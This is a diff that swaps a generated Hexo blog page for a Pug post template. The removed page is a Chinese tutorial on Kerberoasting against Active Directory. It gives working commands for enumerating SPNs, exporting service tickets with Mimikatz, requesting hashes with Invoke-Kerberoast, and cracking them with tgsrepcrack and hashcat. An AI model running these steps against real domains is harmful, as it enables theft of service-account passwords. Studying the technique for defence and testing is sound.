@@ -1,237 +1,39 @@
-<!DOCTYPE html>
-<html lang="en">
-<head><meta name="generator" content="Hexo 3.8.0">
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="keyword" content="">
-    <link rel="shortcut icon" href="/c1y2m3.github.io/img/favicon.ico">
+extends includes/layout
 
-    <title>
-        
-        域渗透之Kerberoasting攻击 - undefined
-        
-    </title>
+block content
 
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/aircloud.css">
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
-    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
-    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
-    <!-- ga & ba script hoook -->
-    <script></script>
-</head>
+    section#wrapper.post
+        article
+            header
+                h1!=page.title
+                h2.headline!=date(page.date, 'MMM DD, YYYY h:mm')
+                    |·
+                    |#{wordcount(page.content)} words
+                    |·
+                    |#{min2read(page.content)} minutes read
+                    span.tags
 
-<body>
+            if toc(page.content)
+                div#toc!=toc(page.content,{list_number:false})
 
-<div class="site-nav-toggle" id="site-nav-toggle">
-    <button>
-        <span class="btn-bar"></span>
-        <span class="btn-bar"></span>
-        <span class="btn-bar"></span>
-    </button>
-</div>
+            section#post-body!=page.content
 
-<div class="index-about">
-    <i>  </i>
-</div>
+            - var prev = page.prev ? page.prev.path : false;
+            - var next = page.next ? page.next.path : false;
+            nav#post-nav
+                span.prev
+                    if page.prev
+                        a(href=url_for(prev))
+                            span.arrow ←
+                            | Newer Posts
+                span.next
+                    if page.next
+                        a(href=url_for(next))
+                            | Older Posts
+                            span.arrow →
 
-<div class="index-container">
-    
-    <div class="index-left">
-        
-<div class="nav" id="nav">
-    <div class="avatar-name">
-        <div class="avatar ">
-            <img src="/c1y2m3.github.io/">
-        </div>
-        <div class="name">
-            <i>John Doe</i>
-        </div>
-    </div>
-    <div class="contents" id="nav-content">
-        <ul>
-            <li>
-                <a href="/c1y2m3.github.io/">
-                    <i class="iconfont icon-shouye1"></i>
-                    <span>HOME</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/tags">
-                    <i class="iconfont icon-biaoqian1"></i>
-                    <span>TAGS</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/archives">
-                    <i class="iconfont icon-guidang2"></i>
-                    <span>ARCHIVES</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/about/">
-                    <i class="iconfont icon-guanyu2"></i>
-                    <span>ABOUT</span>
-                </a>
-            </li>
-            
-        </ul>
-    </div>
-    
-        <div id="toc" class="toc-article">
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基本概念"><span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SPN的格式："><span class="toc-text">SPN的格式：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查询SPN"><span class="toc-text">查询SPN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos的原理："><span class="toc-text">Kerberos的原理：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><span class="toc-text">2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberoasting的实现方法"><span class="toc-text">Kerberoasting的实现方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#破解："><span class="toc-text">破解：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二、使用Powershell实现"><span class="toc-text">二、使用Powershell实现</span></a></li></ol>
-</div>
-    
-</div>
-
-
-<div class="search-field" id="search-field">
-    <div class="search-container">
-        <div class="search-input">
-            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
-            <input id="search-input">
-            <span id="begin-search">search</span>
-        </div>
-        <div class="search-result-container" id="search-result-container">
-
-        </div>
-    </div>
-</div>
-
-        <div class="index-about-mobile">
-            <i>  </i>
-        </div>
-    </div>
-    
-    <div class="index-middle">
-        <!-- Main Content -->
-        
-
-
-<div class="post-container">
-    <div class="post-title">
-        域渗透之Kerberoasting攻击
-    </div>
-
-    <div class="post-meta">
-        <span class="attr">Post：<span>2019-04-02 21:50:00</span></span>
-        
-        
-        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
-</span>
-
-    </div>
-    <div class="post-content ">
-        <h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>SPN</p>
-<p>全称 <code>Service Principal Names</code></p>
-<p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p>
-<p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p>
-<p>当一个服务的权限为 <code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p>
-<p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
-<h1 id="SPN的格式："><a href="#SPN的格式：" class="headerlink" title="SPN的格式："></a>SPN的格式：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5ca32869e67d0a40cbc9b874" alt=""></p>
-<p>tips：</p>
-<p>1、serviceclass 可以理解为服务的名称，常见的有www、SMTP、DNS、exchange、HOST等</p>
-<p>2、host有两种形式，FQDN和NetBIOS名,例如WIN-TL226LF48RT.corp.vk.local和WIN-TL226LF48RT</p>
-<h1 id="查询SPN"><a href="#查询SPN" class="headerlink" title="查询SPN"></a>查询SPN</h1><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分,因此查询SPN的操作难以被检测到</p>
-<p>(1) 使用SetSPN</p>
-<p>Windows下自带工具</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q */*</span><br></pre></td></tr></table></figure>
-<p>查看test域内所有的SPN:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -T test -q */*</span><br></pre></td></tr></table></figure>
-<h1 id="Kerberos的原理："><a href="#Kerberos的原理：" class="headerlink" title="Kerberos的原理："></a>Kerberos的原理：</h1><p><img src="https://green-m.github.io/styles/images/kerberos/kerberos_01.png" alt=""></p>
-<p>在4.tgs_reply,用户将收到由目标服务实例的NTLM hash加密生成的TGS(Service ticket)， 加密算法为RC4-HMAC</p>
-<p>站在利用的角度，当获得这个TGS后，我们可以尝试穷举口令，模拟加密过程，生产TGS进行比较。如果TGS相同，就能获取到目标实例的明文口令。</p>
-<h1 id="2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><a href="#2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系" class="headerlink" title="2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"></a>2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</h1><p>这里举一个例子：</p>
-<p>用户a要访问Mysql服务的资源，进行4.tgs_reply时,步骤如下：</p>
-<p>(1)Domain Controller查询MySQL服务的SPN</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果该SPN注册在机器帐户(Computers)下，将会查询所有机器帐户(Computers)的servicePrincipalName属性，找到对应的帐户</span><br><span class="line"></span><br><span class="line">如果该SPN注册在域用户帐户(Users)下，将会查询所有域用户(Users)的servicePrincipalName属性，找到对应的帐户</span><br></pre></td></tr></table></figure>
-<p>(2)找到对应的帐户后，使用该帐户的NTLM hash，生成TGS</p>
-<h1 id="Kerberoasting的实现方法"><a href="#Kerberoasting的实现方法" class="headerlink" title="Kerberoasting的实现方法"></a>Kerberoasting的实现方法</h1><p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p>
-<p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p>
-<p>具体思路为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询SPN -&gt; 请求TGS -&gt; 导出TGS -&gt; 暴力破解</span><br></pre></td></tr></table></figure>
-<p> 一、使用Mimikatz实现:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5ca33aaa2711cd74739042e5" alt=""></p>
-<h1 id="破解："><a href="#破解：" class="headerlink" title="破解："></a>破解：</h1><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py wordlist.txt 0-40e00000-Administrator@krbtgt~CORP.VK.LOCAL-CORP.VK.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
-<h1 id="二、使用Powershell实现"><a href="#二、使用Powershell实现" class="headerlink" title="二、使用Powershell实现"></a>二、使用Powershell实现</h1><p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p>
-<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
-<p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p>
-<p>实例演示：</p>
-<p>在域内一台主机上以普通用户权限执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure>
-<p>-AdminCount表示选择高权限的用户</p>
-<p>输出结果如下图</p>
-<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-2.png" alt=""></p>
-<p>只提取Hash：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>
-<p>使用hashcat破解的参数如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure>
-<p>  破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p>
-<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-4.png" alt=""></p>
-
-        
-        <br>
-        <div id="comment-container">
-        </div>
-        <div id="disqus_thread"></div>
-
-        <div id="lv-container">
-        </div>
-
-    </div>
-</div>
-
-    </div>
-</div>
-
-
-<footer class="footer">
-    <ul class="list-inline text-center">
-        
-        
-
-        
-
-        
-
-        
-
-        
-
-    </ul>
-    
-    <p>
-        <span id="busuanzi_container_site_pv">
-            <span id="busuanzi_value_site_pv"></span>PV
-        </span>
-        <span id="busuanzi_container_site_uv">
-            <span id="busuanzi_value_site_uv"></span>UV
-        </span>
-        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
-</footer>
+            include includes/comment.pug
 
 
 
 
-</body>
-
-<script>
-    // We expose some of the variables needed by the front end
-    window.hexo_search_path = ""
-    window.hexo_root = "/c1y2m3.github.io/"
-    window.isPost = true
-</script>
-<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
-<script src="/c1y2m3.github.io/js/index.js"></script>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-
-</html>
